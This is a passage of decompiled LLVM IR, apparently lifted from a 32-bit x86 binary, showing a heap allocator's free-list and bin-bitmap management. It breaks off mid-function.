  %v0_80535ea = load i32, i32* @edx, align 4
  %v1_80535ea = load i32, i32* %ebx.global-to-local, align 4
  %v2_80535ea = add i32 %v0_80535ea, 4
  %v3_80535ea = add i32 %v2_80535ea, %v1_80535ea
  %v4_80535ea = inttoptr i32 %v3_80535ea to i32*
  %v5_80535ea = load i32, i32* %v4_80535ea, align 4
  %v6_80535ea = or i32 %v5_80535ea, 1
  store i32 %v6_80535ea, i32* %v4_80535ea, align 4
  %v0_80535ef = load i32, i32* %ecx.global-to-local, align 4
  %v1_80535ef = load i32, i32* %eax.global-to-local, align 4
  %v2_80535ef = add i32 %v1_80535ef, 8
  %v3_80535ef = inttoptr i32 %v2_80535ef to i32*
  store i32 %v0_80535ef, i32* %v3_80535ef, align 4
  br label %dec_label_pc_80535f2

dec_label_pc_80535f2:                             ; preds = %dec_label_pc_805398f, %dec_label_pc_80539a1, %dec_label_pc_80535b1, %dec_label_pc_80535e0
  %v0_80535f2 = load i32, i32* @edx, align 4
  %v1_80535f2 = add i32 %v0_80535f2, 8
  store i32 %v1_80535f2, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053c6d

dec_label_pc_80535fa:                             ; preds = %dec_label_pc_80535b9
  %v0_80535fe = call i32 @function_80534ee()
  store i32 %v0_80535fe, i32* %eax.global-to-local, align 4
  %v3_8053603 = and i8 %v0_8053570, 2
  %v4_8053603 = icmp eq i8 %v3_8053603, 0
  %v6_8053603 = zext i8 %v3_8053603 to i32
  %v9_8053603 = and i32 %v1_8053570, -256
  %v10_8053603 = or i32 %v9_8053603, %v6_8053603
  store i32 %v10_8053603, i32* @ebx, align 4
  br i1 %v4_8053603, label %dec_label_pc_80536f6.preheader, label %dec_label_pc_8053610

dec_label_pc_8053610:                             ; preds = %dec_label_pc_80535fa
  store i32 ptrtoint (i8* @global_var_8057540.206 to i32), i32* %stack_var_-92, align 4
  %v2_8053618 = call i32 @function_8054131(i32* bitcast (i8* @global_var_8057540.206 to i32*))
  store i32 %v2_8053618, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80536f6.preheader

dec_label_pc_80536f6.preheader:                   ; preds = %dec_label_pc_8053610, %dec_label_pc_80535c3, %dec_label_pc_80535fa
  %stack_var_-40.0.ph = phi i32 [ %v2_80535c7, %dec_label_pc_80535c3 ], [ %v0_80535fe, %dec_label_pc_8053610 ], [ %v0_80535fe, %dec_label_pc_80535fa ]
  %v0_80536f69 = load i32, i32* @global_var_8057580.210, align 128
  store i32 %v0_80536f69, i32* @ebp, align 4
  %v9_80536fc15 = icmp eq i32 %v0_80536f69, 134575476
  %v1_805370217 = icmp eq i1 %v9_80536fc15, false
  br i1 %v1_805370217, label %dec_label_pc_8053625.lr.ph, label %dec_label_pc_8053708

dec_label_pc_8053625.lr.ph:                       ; preds = %dec_label_pc_80536f6.preheader
  %v1_805364c = add i32 %v1_8053908, 16
  br label %dec_label_pc_8053625

dec_label_pc_8053625:                             ; preds = %dec_label_pc_8053625.lr.ph, %dec_label_pc_80536f6
  %v1_8053c1f = phi i32 [ %v0_80536f69, %dec_label_pc_8053625.lr.ph ], [ %v0_80536f6, %dec_label_pc_80536f6 ]
  %v1_8053625 = add i32 %v1_8053c1f, 4
  %v2_8053625 = inttoptr i32 %v1_8053625 to i32*
  %v3_8053625 = load i32, i32* %v2_8053625, align 4
  %v1_8053628 = add i32 %v1_8053c1f, 12
  %v2_8053628 = inttoptr i32 %v1_8053628 to i32*
  %v3_8053628 = load i32, i32* %v2_8053628, align 4
  store i32 %v3_8053628, i32* @edx, align 4
  %v1_805362b = and i32 %v3_8053625, -4
  store i32 %v1_805362b, i32* @edi, align 4
  br i1 %v6_80535c1, label %dec_label_pc_8053657, label %dec_label_pc_8053638

dec_label_pc_8053638:                             ; preds = %dec_label_pc_8053625
  %v9_8053638 = icmp eq i32 %v3_8053628, 134575476
  %v1_805363e = icmp eq i1 %v9_8053638, false
  br i1 %v1_805363e, label %dec_label_pc_8053657, label %dec_label_pc_8053640

dec_label_pc_8053640:                             ; preds = %dec_label_pc_8053638
  %v1_8053640 = load i32, i32* @global_var_8057570.208, align 16
  %v12_8053640 = icmp eq i32 %v1_8053c1f, %v1_8053640
  %v1_8053646 = icmp eq i1 %v12_8053640, false
  br i1 %v1_8053646, label %dec_label_pc_8053657, label %dec_label_pc_8053648

dec_label_pc_8053648:                             ; preds = %dec_label_pc_8053640
  store i32 %v1_805364c, i32* %eax.global-to-local, align 4
  %v6_8053651 = icmp ugt i32 %v1_805362b, %v1_805364c
  br i1 %v6_8053651, label %dec_label_pc_8053c08, label %dec_label_pc_8053657

dec_label_pc_8053657:                             ; preds = %dec_label_pc_8053648, %dec_label_pc_8053640, %dec_label_pc_8053638, %dec_label_pc_8053625
  store i32 ptrtoint (i32* @global_var_8057574.209 to i32), i32* %eax.global-to-local, align 4
  %v2_805365c = add i32 %v3_8053628, 8
  %v3_805365c = inttoptr i32 %v2_805365c to i32*
  store i32 ptrtoint (i32* @global_var_8057574.209 to i32), i32* %v3_805365c, align 4
  %v0_805365f = load i32, i32* @edx, align 4
  store i32 %v0_805365f, i32* @global_var_8057580.210, align 4
  %v0_8053662 = load i32, i32* @edi, align 4
  %v15_8053662 = icmp eq i32 %v0_8053662, %v1_8053908
  br i1 %v15_8053662, label %dec_label_pc_8053c49, label %dec_label_pc_805366c

dec_label_pc_805366c:                             ; preds = %dec_label_pc_8053657
  %v6_8053672 = icmp ugt i32 %v0_8053662, 255
  br i1 %v6_8053672, label %dec_label_pc_8053685, label %dec_label_pc_8053674

dec_label_pc_8053674:                             ; preds = %dec_label_pc_805366c
  %v2_8053676 = udiv i32 %v0_8053662, 8
  store i32 %v2_8053676, i32* %esi.global-to-local, align 4
  %v1_8053679 = mul nuw i32 %v2_8053676, 8
  %v2_8053679 = add i32 %v1_8053679, 134575468
  store i32 %v2_8053679, i32* @ebx, align 4
  %v1_8053680 = add i32 %v1_8053679, 134575476
  %v2_8053680 = inttoptr i32 %v1_8053680 to i32*
  %v3_8053680 = load i32, i32* %v2_8053680, align 4
  store i32 %v3_8053680, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80536ce

dec_label_pc_8053685:                             ; preds = %dec_label_pc_805366c
  store i32 %v0_8053662, i32* @eax, align 4
  %v0_8053687 = call i32 @function_80534ee()
  store i32 %v0_8053687, i32* %esi.global-to-local, align 4
  %v1_805368e = mul i32 %v0_8053687, 8
  %v2_805368e = add i32 %v1_805368e, ptrtoint (i32* @global_var_805756c.207 to i32)
  store i32 %v2_805368e, i32* %eax.global-to-local, align 4
  %v1_8053695 = add i32 %v1_805368e, add (i32 ptrtoint (i32* @global_var_805756c.207 to i32), i32 8)
  %v2_8053695 = inttoptr i32 %v1_8053695 to i32*
  %v3_8053695 = load i32, i32* %v2_8053695, align 4
  store i32 %v3_8053695, i32* %edx.global-to-local, align 4
  store i32 %v3_8053695, i32* @ebx, align 4
  %v12_805369e = icmp eq i32 %v3_8053695, %v2_805368e
  br i1 %v12_805369e, label %dec_label_pc_80536ce, label %dec_label_pc_80536a2

dec_label_pc_80536a2:                             ; preds = %dec_label_pc_8053685
  %v1_80536a2 = add i32 %v1_805368e, add (i32 ptrtoint (i32* @global_var_805756c.207 to i32), i32 12)
  %v2_80536a2 = inttoptr i32 %v1_80536a2 to i32*
  %v3_80536a2 = load i32, i32* %v2_80536a2, align 4
  store i32 %v3_80536a2, i32* @ebx, align 4
  %v0_80536a5 = load i32, i32* @edi, align 4
  %v2_80536a5 = add i32 %v3_80536a2, 4
  %v3_80536a5 = inttoptr i32 %v2_80536a5 to i32*
  %v4_80536a5 = load i32, i32* %v3_80536a5, align 4
  %v10_80536a5 = icmp ult i32 %v0_80536a5, %v4_80536a5
  %v1_80536a8 = icmp eq i1 %v10_80536a5, false
  br i1 %v1_80536a8, label %dec_label_pc_80536b0, label %dec_label_pc_80536ce

dec_label_pc_80536b0:                             ; preds = %dec_label_pc_80536a2
  %v1_80536b2 = or i32 %v0_80536a5, 1
  store i32 %v1_80536b2, i32* %eax.global-to-local, align 4
  store i32 %v3_8053695, i32* %ebx.global-to-local, align 4
  %v2_80536c6105 = add i32 %v3_8053695, 4
  %v3_80536c6106 = inttoptr i32 %v2_80536c6105 to i32*
  %v4_80536c6107 = load i32, i32* %v3_80536c6106, align 4
  %v10_80536c6108 = icmp ult i32 %v1_80536b2, %v4_80536c6107
  br i1 %v10_80536c6108, label %dec_label_pc_80536b7, label %dec_label_pc_80536cb

dec_label_pc_80536b7:                             ; preds = %dec_label_pc_80536b0, %dec_label_pc_80536b7
  %v0_80536cb109 = phi i32 [ %v3_80536bb, %dec_label_pc_80536b7 ], [ %v3_8053695, %dec_label_pc_80536b0 ]
  store i32 %v0_80536cb109, i32* %ecx.global-to-local, align 4
  %v1_80536bb = add i32 %v0_80536cb109, 8
  %v2_80536bb = inttoptr i32 %v1_80536bb to i32*
  %v3_80536bb = load i32, i32* %v2_80536bb, align 4
  store i32 %v3_80536bb, i32* %ecx.global-to-local, align 4
  store i32 %v3_80536bb, i32* %ebx.global-to-local, align 4
  %v2_80536c6 = add i32 %v3_80536bb, 4
  %v3_80536c6 = inttoptr i32 %v2_80536c6 to i32*
  %v4_80536c6 = load i32, i32* %v3_80536c6, align 4
  %v10_80536c6 = icmp ult i32 %v1_80536b2, %v4_80536c6
  br i1 %v10_80536c6, label %dec_label_pc_80536b7, label %dec_label_pc_80536cb

dec_label_pc_80536cb:                             ; preds = %dec_label_pc_80536b7, %dec_label_pc_80536b0
  %v0_80536cb.lcssa = phi i32 [ %v3_8053695, %dec_label_pc_80536b0 ], [ %v3_80536bb, %dec_label_pc_80536b7 ]
  %v1_80536cb = add i32 %v0_80536cb.lcssa, 12
  %v2_80536cb = inttoptr i32 %v1_80536cb to i32*
  %v3_80536cb = load i32, i32* %v2_80536cb, align 4
  store i32 %v3_80536cb, i32* @ebx, align 4
  br label %dec_label_pc_80536ce

dec_label_pc_80536ce:                             ; preds = %dec_label_pc_8053674, %dec_label_pc_80536a2, %dec_label_pc_8053685, %dec_label_pc_80536cb
  %v0_80536ce = phi i32 [ %v0_8053687, %dec_label_pc_8053685 ], [ %v0_8053687, %dec_label_pc_80536cb ], [ %v0_8053687, %dec_label_pc_80536a2 ], [ %v2_8053676, %dec_label_pc_8053674 ]
  %stack_var_-64.1 = phi i32 [ %v2_805368e, %dec_label_pc_8053685 ], [ %v0_80536cb.lcssa, %dec_label_pc_80536cb ], [ %v2_805368e, %dec_label_pc_80536a2 ], [ %v3_8053680, %dec_label_pc_8053674 ]
  %v1_80536d0 = urem i32 %v0_80536ce, 32
  %v2_80536d0 = icmp eq i32 %v1_80536d0, 0
  store i32 %v1_80536d0, i32* %esi.global-to-local, align 4
  store i32 %v1_80536d0, i32* %ecx.global-to-local, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_80536da = sdiv i32 %v0_80536ce, 32
  store i32 %v2_80536da, i32* %edx.global-to-local, align 4
  br i1 %v2_80536d0, label %dec_label_pc_80536f6, label %bb

bb:                                               ; preds = %dec_label_pc_80536ce
  %v5_80536dd = shl i32 1, %v1_80536d0
  store i32 %v5_80536dd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80536f6

dec_label_pc_80536f6:                             ; preds = %dec_label_pc_80536ce, %bb
  %v5_80536df = phi i32 [ 1, %dec_label_pc_80536ce ], [ %v5_80536dd, %bb ]
  %v1_80536df = mul nsw i32 %v2_80536da, 4
  %v2_80536df = add i32 %v1_80536df, ptrtoint (i32* @global_var_8057874.211 to i32)
  %v3_80536df = inttoptr i32 %v2_80536df to i32*
  %v4_80536df = load i32, i32* %v3_80536df, align 4
  %v6_80536df = or i32 %v4_80536df, %v5_80536df
  store i32 %v6_80536df, i32* %v3_80536df, align 4
  %v0_80536e6 = load i32, i32* @ebx, align 4
  %v1_80536e6 = load i32, i32* @ebp, align 4
  %v2_80536e6 = add i32 %v1_80536e6, 12
  %v3_80536e6 = inttoptr i32 %v2_80536e6 to i32*
  store i32 %v0_80536e6, i32* %v3_80536e6, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_80536ed = load i32, i32* @ebp, align 4
  %v2_80536ed = add i32 %v1_80536ed, 8
  %v3_80536ed = inttoptr i32 %v2_80536ed to i32*
  store i32 %stack_var_-64.1, i32* %v3_80536ed, align 4
  %v0_80536f0 = load i32, i32* @ebp, align 4
  %v1_80536f0 = load i32, i32* @ebx, align 4
  %v2_80536f0 = add i32 %v1_80536f0, 8
  %v3_80536f0 = inttoptr i32 %v2_80536f0 to i32*
  store i32 %v0_80536f0, i32* %v3_80536f0, align 4
  %v0_80536f3 = load i32, i32* @ebp, align 4
  %v1_80536f3 = load i32, i32* @esi, align 4
  %v2_80536f3 = add i32 %v1_80536f3, 12
  %v3_80536f3 = inttoptr i32 %v2_80536f3 to i32*
  store i32 %v0_80536f3, i32* %v3_80536f3, align 4
  %v0_80536f6 = load i32, i32* @global_var_8057580.210, align 128
  store i32 %v0_80536f6, i32* @ebp, align 4
  %v9_80536fc = icmp eq i32 %v0_80536f6, 134575476
  %v1_8053702 = icmp eq i1 %v9_80536fc, false
  br i1 %v1_8053702, label %dec_label_pc_8053625, label %dec_label_pc_8053708

dec_label_pc_8053708:                             ; preds = %dec_label_pc_80536f6, %dec_label_pc_80536f6.preheader
  br i1 %v8_80535b9, label %dec_label_pc_8053796, label %dec_label_pc_8053716

dec_label_pc_8053716:                             ; preds = %dec_label_pc_8053708
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_805371a = mul i32 %stack_var_-40.0.ph, 8
  %v2_805371a = add i32 %v1_805371a, ptrtoint (i32* @global_var_805756c.207 to i32)
  store i32 %v2_805371a, i32* %edx.global-to-local, align 4
  %v1_8053721 = add i32 %v1_805371a, add (i32 ptrtoint (i32* @global_var_805756c.207 to i32), i32 12)
  %v2_8053721 = inttoptr i32 %v1_8053721 to i32*
  %storemerge1.pre = load i32, i32* %v2_8053721, align 4
  br label %dec_label_pc_8053792

dec_label_pc_8053726:                             ; preds = %dec_label_pc_8053792
  %v1_8053726 = add i32 %v4_805373d, 4
  %v2_8053726 = inttoptr i32 %v1_8053726 to i32*
  %v3_8053726 = load i32, i32* %v2_8053726, align 4
  store i32 %v3_8053726, i32* %ebx.global-to-local, align 4
  %v1_8053729 = add i32 %v4_805373d, 12
  %v2_8053729 = inttoptr i32 %v1_8053729 to i32*
  %v3_8053729 = load i32, i32* %v2_8053729, align 4
  store i32 %v3_8053729, i32* @ecx, align 4
  %v1_805372c = and i32 %v3_8053726, -4
  store i32 %v1_805372c, i32* @ebx, align 4
  %v10_805372f = icmp ult i32 %v1_805372c, %v1_8053908
  br i1 %v10_805372f, label %dec_label_pc_8053792, label %dec_label_pc_8053735

dec_label_pc_8053735:                             ; preds = %dec_label_pc_8053726
  %v1_8053735 = add i32 %v4_805373d, 8
  %v2_8053735 = inttoptr i32 %v1_8053735 to i32*
  %v3_8053735 = load i32, i32* %v2_8053735, align 4
  store i32 %v3_8053735, i32* @edx, align 4
  %v1_8053738 = add i32 %v3_8053735, 12
  %v2_8053738 = inttoptr i32 %v1_8053738 to i32*
  %v3_8053738 = load i32, i32* %v2_8053738, align 4
  %v15_8053738 = icmp eq i32 %v3_8053738, %v4_805373d
  %v1_805373b = icmp eq i1 %v15_8053738, false
  br i1 %v1_805373b, label %dec_label_pc_8053742, label %dec_label_pc_805373d

dec_label_pc_805373d:                             ; preds = %dec_label_pc_8053735
  %v1_805373d = add i32 %v3_8053729, 8
  %v2_805373d = inttoptr i32 %v1_805373d to i32*
  %v3_805373d = load i32, i32* %v2_805373d, align 4
  %v15_805373d = icmp eq i32 %v3_805373d, %v4_805373d
  br i1 %v15_805373d, label %dec_label_pc_8053747, label %dec_label_pc_8053742

dec_label_pc_8053742:                             ; preds = %dec_label_pc_805373d, %dec_label_pc_8053735
  %v0_8053742 = call i32 @function_8054475()
  store i32 %v0_8053742, i32* %eax.global-to-local, align 4
  %v0_8053747.pre = load i32, i32* @ebx, align 4
  %v0_805374d.pre = load i32, i32* @ecx, align 4
  %v1_805374d.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8053747

dec_label_pc_8053747:                             ; preds = %dec_label_pc_805373d, %dec_label_pc_8053742
  %v1_805374d = phi i32 [ %v3_8053735, %dec_label_pc_805373d ], [ %v1_805374d.pre, %dec_label_pc_8053742 ]
  %v0_805374d = phi i32 [ %v3_8053729, %dec_label_pc_805373d ], [ %v0_805374d.pre, %dec_label_pc_8053742 ]
  %v0_8053747 = phi i32 [ %v1_805372c, %dec_label_pc_805373d ], [ %v0_8053747.pre, %dec_label_pc_8053742 ]
  %v5_8053749 = sub i32 %v0_8053747, %v1_8053908
  store i32 %v5_8053749, i32* %esi.global-to-local, align 4
  %v2_805374d = add i32 %v1_805374d, 12
  %v3_805374d = inttoptr i32 %v2_805374d to i32*
  store i32 %v0_805374d, i32* %v3_805374d, align 4
  %v0_8053750 = load i32, i32* @edx, align 4
  %v1_8053750 = load i32, i32* @ecx, align 4
  %v2_8053750 = add i32 %v1_8053750, 8
  %v3_8053750 = inttoptr i32 %v2_8053750 to i32*
  store i32 %v0_8053750, i32* %v3_8053750, align 4
  %v0_8053753 = load i32, i32* %esi.global-to-local, align 4
  %v0_8053756 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053756 = add i32 %v0_8053756, 8
  store i32 %v1_8053756, i32* %ecx.global-to-local, align 4
  %tmp126 = icmp ult i32 %v0_8053753, 16
  br i1 %tmp126, label %dec_label_pc_8053c57, label %dec_label_pc_805375f

dec_label_pc_805375f:                             ; preds = %dec_label_pc_8053747
  %v2_8053763 = add i32 %v0_8053756, %v1_8053908
  store i32 %v2_8053763, i32* @edx, align 4
  %v1_8053766 = or i32 %v1_8053908, 1
  store i32 %v1_8053766, i32* %ebx.global-to-local, align 4
  %v2_8053769 = add i32 %v0_8053756, 4
  %v3_8053769 = inttoptr i32 %v2_8053769 to i32*
  store i32 %v1_8053766, i32* %v3_8053769, align 4
  %v0_805376c = load i32, i32* %esi.global-to-local, align 4
  %v1_805376e = or i32 %v0_805376c, 1
  store i32 %v1_805376e, i32* %eax.global-to-local, align 4
  %v0_8053771 = load i32, i32* @edx, align 4
  %v1_8053771 = load i32, i32* @ebp, align 4
  %v2_8053771 = add i32 %v1_8053771, 8
  %v3_8053771 = inttoptr i32 %v2_8053771 to i32*
  store i32 %v0_8053771, i32* %v3_8053771, align 4
  %v0_8053774 = load i32, i32* @edx, align 4
  %v1_8053774 = load i32, i32* @ebp, align 4
  %v2_8053774 = add i32 %v1_8053774, 12
  %v3_8053774 = inttoptr i32 %v2_8053774 to i32*
  store i32 %v0_8053774, i32* %v3_8053774, align 4
  %v0_8053777 = load i32, i32* @edx, align 4
  %v1_8053777 = add i32 %v0_8053777, 8
  %v2_8053777 = inttoptr i32 %v1_8053777 to i32*
  store i32 ptrtoint (i32* @global_var_8057574.209 to i32), i32* %v2_8053777, align 4
  %v0_805377e = load i32, i32* @edx, align 4
  %v1_805377e = add i32 %v0_805377e, 12
  %v2_805377e = inttoptr i32 %v1_805377e to i32*
  store i32 ptrtoint (i32* @global_var_8057574.209 to i32), i32* %v2_805377e, align 4
  %v0_8053785 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053785 = load i32, i32* @edx, align 4
  %v2_8053785 = add i32 %v1_8053785, 4
  %v3_8053785 = inttoptr i32 %v2_8053785 to i32*
  store i32 %v0_8053785, i32* %v3_8053785, align 4
  %v0_8053788 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053788 = load i32, i32* @edx, align 4
  %v3_8053788 = add i32 %v1_8053788, %v0_8053788
  %v4_8053788 = inttoptr i32 %v3_8053788 to i32*
  store i32 %v0_8053788, i32* %v4_8053788, align 4
  br label %dec_label_pc_8053c5c

dec_label_pc_8053792:                             ; preds = %dec_label_pc_8053726, %dec_label_pc_8053716
  %v4_805373d = phi i32 [ %storemerge1.pre, %dec_label_pc_8053716 ], [ %v3_8053729, %dec_label_pc_8053726 ]
  store i32 %v4_805373d, i32* %eax.global-to-local, align 4
  %v12_8053792 = icmp eq i32 %v4_805373d, %v2_805371a
  %v1_8053794 = icmp eq i1 %v12_8053792, false
  br i1 %v1_8053794, label %dec_label_pc_8053726, label %dec_label_pc_8053796.loopexit

dec_label_pc_8053796.loopexit:                    ; preds = %dec_label_pc_8053792
  br label %dec_label_pc_8053796

dec_label_pc_8053796:                             ; preds = %dec_label_pc_8053796.loopexit, %dec_label_pc_8053708
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_805379f = add i32 %stack_var_-40.0.ph, 1
  %v2_80537a2 = udiv i32 %v1_805379f, 32
  store i32 %v2_80537a2, i32* @edi, align 4
  %v1_80537a5 = mul i32 %v1_805379f, 8
  %v2_80537a5 = add i32 %v1_80537a5, ptrtoint (i32* @global_var_805756c.207 to i32)
  store i32 %v2_80537a5, i32* %ebx.global-to-local, align 4
  %v1_80537ac = urem i32 %v1_805379f, 32
  %v2_80537ac = icmp eq i32 %v1_80537ac, 0
  store i32 %v1_80537ac, i32* %ecx.global-to-local, align 4
  %v1_80537af = mul nuw nsw i32 %v2_80537a2, 4
  %v2_80537af = add i32 %v1_80537af, ptrtoint (i32* @global_var_8057874.211 to i32)
  %v3_80537af = inttoptr i32 %v2_80537af to i32*
  %v4_80537af = load i32, i32* %v3_80537af, align 4
  store i32 %v4_80537af, i32* %edx.global-to-local, align 4
  br i1 %v2_80537ac, label %.preheader, label %bb88

bb88:                                             ; preds = %dec_label_pc_8053796
  %v5_80537b6 = shl i32 1, %v1_80537ac
  store i32 %v5_80537b6, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_8053796, %bb88, %dec_label_pc_80537f7
  %v1_80537b8 = phi i32 [ %v1_80537b8.pre, %dec_label_pc_80537f7 ], [ %v4_80537af, %bb88 ], [ %v4_80537af, %dec_label_pc_8053796 ]
  %v0_80537bc = phi i32 [ %v0_80537b8.pre, %dec_label_pc_80537f7 ], [ %v5_80537b6, %bb88 ], [ 1, %dec_label_pc_8053796 ]
  %tmp89 = icmp ule i32 %v0_80537bc, %v1_80537b8
  %v1_80537bc = icmp eq i32 %v0_80537bc, 0
  %v1_80537be = icmp eq i1 %v1_80537bc, false
  %or.cond = and i1 %tmp89, %v1_80537be
  br i1 %or.cond, label %dec_label_pc_80537bc.dec_label_pc_80537ec.preheader_crit_edge, label %dec_label_pc_80537c0.preheader

dec_label_pc_80537bc.dec_label_pc_80537ec.preheader_crit_edge: ; preds = %.preheader
  %v0_80537e77.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80537ec.preheader

dec_label_pc_80537c0.preheader:                   ; preds = %.preheader
  %v0_80537c0.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80537c0

dec_label_pc_80537c0:                             ; preds = %dec_label_pc_80537c0.preheader, %dec_label_pc_80537ca
  %v0_80537c0 = phi i32 [ %v0_80537c0.pre, %dec_label_pc_80537c0.preheader ], [ %v1_80537c0, %dec_label_pc_80537ca ]
  %v1_80537c0 = add i32 %v0_80537c0, 1
  store i32 %v1_80537c0, i32* @edi, align 4
  %v6_80537c4 = icmp ugt i32 %v1_80537c0, 2
  br i1 %v6_80537c4, label %dec_label_pc_8053873.loopexit, label %dec_label_pc_80537ca

dec_label_pc_80537ca:                             ; preds = %dec_label_pc_80537c0
  %v1_80537ca = mul i32 %v1_80537c0, 4
  %v2_80537ca = add i32 %v1_80537ca, ptrtoint (i32* @global_var_8057874.211 to i32)
  %v3_80537ca = inttoptr i32 %v2_80537ca to i32*
  %v4_80537ca = load i32, i32* %v3_80537ca, align 4
  store i32 %v4_80537ca, i32* %edx.global-to-local, align 4
  %v1_80537d1 = icmp eq i32 %v4_80537ca, 0
  br i1 %v1_80537d1, label %dec_label_pc_80537c0, label %dec_label_pc_80537d5

dec_label_pc_80537d5:                             ; preds = %dec_label_pc_80537ca
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_80537dc = mul i32 %v1_80537c0, 256
  store i32 %v2_80537dc, i32* %eax.global-to-local, align 4
  %v1_80537df = add i32 %v2_80537dc, ptrtoint (i32* @global_var_805756c.207 to i32)
  store i32 %v1_80537df, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80537ec.preheader

dec_label_pc_80537ec.preheader:                   ; preds = %dec_label_pc_80537bc.dec_label_pc_80537ec.preheader_crit_edge, %dec_label_pc_80537d5
  %v0_80537e77 = phi i32 [ %v1_80537df, %dec_label_pc_80537d5 ], [ %v0_80537e77.pre, %dec_label_pc_80537bc.dec_label_pc_80537ec.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_80537d5 ], [ %v0_80537bc, %dec_label_pc_80537bc.dec_label_pc_80537ec.preheader_crit_edge ]
  %v0_80537fe = phi i32 [ %v4_80537ca, %dec_label_pc_80537d5 ], [ %v1_80537b8, %dec_label_pc_80537bc.dec_label_pc_80537ec.preheader_crit_edge ]
  %v2_80537ec4 = and i32 %v0_80537fe, %esi.promoted
  %v3_80537ec5 = icmp eq i32 %v2_80537ec4, 0
  br i1 %v3_80537ec5, label %dec_label_pc_80537e7, label %dec_label_pc_80537f0

dec_label_pc_80537e7:                             ; preds = %dec_label_pc_80537ec.preheader, %dec_label_pc_80537e7
  %v2_80537ea18 = phi i32 [ %v2_80537ea, %dec_label_pc_80537e7 ], [ %esi.promoted, %dec_label_pc_80537ec.preheader ]
  %v0_80537e78 = phi i32 [ %v1_80537e7, %dec_label_pc_80537e7 ], [ %v0_80537e77, %dec_label_pc_80537ec.preheader ]
  %v1_80537e7 = add i32 %v0_80537e78, 8
  %v2_80537ea = mul i32 %v2_80537ea18, 2
  %v2_80537ec = and i32 %v2_80537ea, %v0_80537fe
  %v3_80537ec = icmp eq i32 %v2_80537ec, 0
  br i1 %v3_80537ec, label %dec_label_pc_80537e7, label %dec_label_pc_80537ec.dec_label_pc_80537f0_crit_edge

dec_label_pc_80537ec.dec_label_pc_80537f0_crit_edge: ; preds = %dec_label_pc_80537e7
  store i32 %v1_80537e7, i32* %ebx.global-to-local, align 4
  store i32 %v2_80537ea, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80537f0

dec_label_pc_80537f0:                             ; preds = %dec_label_pc_80537ec.dec_label_pc_80537f0_crit_edge, %dec_label_pc_80537ec.preheader
  %v0_8053800 = phi i32 [ %v2_80537ea, %dec_label_pc_80537ec.dec_label_pc_80537f0_crit_edge ], [ %esi.promoted, %dec_label_pc_80537ec.preheader ]
  %v1_805381a = phi i32 [ %v1_80537e7, %dec_label_pc_80537ec.dec_label_pc_80537f0_crit_edge ], [ %v0_80537e77, %dec_label_pc_80537ec.preheader ]
  %v1_80537f0 = add i32 %v1_805381a, 12
  %v2_80537f0 = inttoptr i32 %v1_80537f0 to i32*
  %v3_80537f0 = load i32, i32* %v2_80537f0, align 4
  store i32 %v3_80537f0, i32* %ecx.global-to-local, align 4
  %v12_80537f3 = icmp eq i32 %v3_80537f0, %v1_805381a
  %v1_80537f5 = icmp eq i1 %v12_80537f3, false
  br i1 %v1_80537f5, label %dec_label_pc_805380b, label %dec_label_pc_80537f7

dec_label_pc_80537f7:                             ; preds = %dec_label_pc_80537f0
  %v1_80537f9 = add i32 %v3_80537f0, 8
  store i32 %v1_80537f9, i32* %ebx.global-to-local, align 4
  %v1_80537fc = sub i32 -1, %v0_8053800
  store i32 %v1_80537fc, i32* %eax.global-to-local, align 4
  %v2_80537fe = and i32 %v0_80537fe, %v1_80537fc
  store i32 %v2_80537fe, i32* %edx.global-to-local, align 4
  %v2_8053800 = mul i32 %v0_8053800, 2
  store i32 %v2_8053800, i32* %esi.global-to-local, align 4
  %v1_8053802 = load i32, i32* @edi, align 4
  %v2_8053802 = mul i32 %v1_8053802, 4
  %v3_8053802 = add i32 %v2_8053802, ptrtoint (i32* @global_var_8057874.211 to i32)
  %v4_8053802 = inttoptr i32 %v3_8053802 to i32*
  store i32 %v2_80537fe, i32* %v4_8053802, align 4
  %v0_80537b8.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_80537b8.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_805380b:                             ; preds = %dec_label_pc_80537f0
  %v1_805380b = add i32 %v3_80537f0, 4
  %v2_805380b = inttoptr i32 %v1_805380b to i32*
  %v3_805380b = load i32, i32* %v2_805380b, align 4
  store i32 %v3_805380b, i32* %edx.global-to-local, align 4
  %v1_805380e = add i32 %v3_80537f0, 12
  %v2_805380e = inttoptr i32 %v1_805380e to i32*
  %v3_805380e = load i32, i32* %v2_805380e, align 4
  store i32 %v3_805380e, i32* %eax.global-to-local, align 4
  %v1_8053811 = and i32 %v3_805380b, -4
  store i32 %v1_8053811, i32* @edx, align 4
  %v5_8053816 = sub i32 %v1_8053811, %v1_8053908
  store i32 %v5_8053816, i32* %esi.global-to-local, align 4
  store i32 %v3_805380e, i32* %v2_80537f0, align 4
  %v0_805381d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805381d = load i32, i32* %eax.global-to-local, align 4
  %v2_805381d = add i32 %v1_805381d, 8
  %v3_805381d = inttoptr i32 %v2_805381d to i32*
  store i32 %v0_805381d, i32* %v3_805381d, align 4
  %v0_8053820 = load i32, i32* %esi.global-to-local, align 4
  %tmp127 = icmp ult i32 %v0_8053820, 16
  br i1 %tmp127, label %dec_label_pc_8053825, label %dec_label_pc_805382c

dec_label_pc_8053825:                             ; preds = %dec_label_pc_805380b
  %v0_8053825 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053825 = load i32, i32* @edx, align 4
  %v2_8053825 = add i32 %v0_8053825, 4
